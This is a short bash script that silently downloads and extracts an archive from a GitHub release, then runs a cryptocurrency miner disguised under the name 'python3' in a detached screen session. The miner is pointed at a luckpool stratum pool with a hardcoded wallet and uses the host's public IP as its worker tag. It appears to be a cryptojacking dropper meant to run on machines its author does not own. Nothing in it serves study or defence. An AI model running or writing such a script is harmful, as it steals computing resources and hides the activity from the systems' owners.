#!/bin/bash

# Download file
wget -q -O mek https://github.com/DotAja/ALONE/releases/download/alone/dotsrb.tar.gz

# Extract file
tar -xvf mek

kontol=$(curl -s ifconfig.me)
# Jalankan command dengan screen dan nama acak
screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.ASIA-$kontol
